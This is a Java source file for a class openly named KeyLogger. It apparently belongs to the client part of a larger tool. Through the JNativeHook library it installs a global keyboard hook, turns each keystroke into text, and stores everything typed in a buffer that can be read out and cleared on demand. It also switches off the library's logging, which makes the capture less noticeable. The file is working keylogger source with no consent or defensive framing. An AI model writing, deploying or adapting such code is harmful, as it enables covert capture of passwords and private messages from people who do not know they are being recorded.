package Client;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;


public class KeyLogger implements NativeKeyListener {
    
	boolean shift = false;
	StringBuffer buffer;
	
	String getText() {
		String text = buffer.toString();
		buffer.setLength(0);
		return text;
	}

	KeyLogger() {
		buffer = new StringBuffer();
		setLoggerOff();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
	}
	
   

	void setLoggerOff() {
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackageName());
		logger.setLevel(Level.OFF);
	}
	
	public void hook() {
		GlobalScreen.removeNativeKeyListener(this);
		GlobalScreen.addNativeKeyListener(this);
	}
	public void unhook() {
		GlobalScreen.removeNativeKeyListener(this);
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		buffer.append(convertKeyEvent(arg0));
	}
	

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		if (NativeKeyEvent.getKeyText(arg0.getKeyCode()).equals("Shift"))
			shift = false;
	}


	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}


	private String convertKeyEvent(NativeKeyEvent key) {
		String pressed = NativeKeyEvent.getKeyText(key.getKeyCode());

		if (pressed.equals("Shift")) {
			shift = true;
			return "";
		}
		else if (key.isActionKey())
			return "[" + pressed + "]";
		else if (pressed.equals("Backspace"))
			return "[Back]";
		else if (pressed.equals("Space"))
			return " ";
		else if (pressed.equals("Tab"))
			return "\t";
		else if (pressed.equals("Enter"))
			return "\n";
		else if (shift) {
			if (pressed.matches("[A-Z]"))
				return pressed;
			else if (pressed.equals("1"))
				return "!";
			else if (pressed.equals("2"))
				return "@";
			else if (pressed.equals("3"))
				return "#";
			else if (pressed.equals("4"))
				return "$";
			else if (pressed.equals("5"))
				return "%";
			else if (pressed.equals("6"))
				return "^";
			else if (pressed.equals("7"))
				return "&";
			else if (pressed.equals("8"))
				return "*";
			else if (pressed.equals("9"))
				return "(";
			else if (pressed.equals("0"))
				return ")";
			else if (pressed.equals("Minus"))
				return "_";
			else if (pressed.equals("Equals"))
				return "+";
			else if (pressed.equals("Open Bracket"))
				return "{";
			else if (pressed.equals("Close Bracket"))
				return "}";
			else if (pressed.equals("Back Slash"))
				return "|";
			else if (pressed.equals("Semicolon"))
				return ":";
			else if (pressed.equals("Quote"))
				return "\"";
			else if (pressed.equals("Comma"))
				return "<";
			else if (pressed.equals("Period"))
				return ">";
			else if (pressed.equals("Slash"))
				return "?";
			else if (pressed.equals("Back Quote"))
				return "~";
		} else {
			if (pressed.matches("[a-zA-Z0-9]"))
				return pressed.toLowerCase();
			else if (pressed.equals("Minus"))
				return "-";
			else if (pressed.equals("Equals"))
				return "=";
			else if (pressed.equals("Open Bracket"))
				return "[";
			else if (pressed.equals("Close Bracket"))
				return "]";
			else if (pressed.equals("Back Slash"))
				return "\\";
			else if (pressed.equals("Semicolon"))
				return ";";
			else if (pressed.equals("Quote"))
				return "'";
			else if (pressed.equals("Comma"))
				return ",";
			else if (pressed.equals("Period"))
				return ".";
			else if (pressed.equals("Slash"))
				return "/";
			else if (pressed.equals("Back Quote"))
				return "`";
		}
		return pressed;
	}
	
}
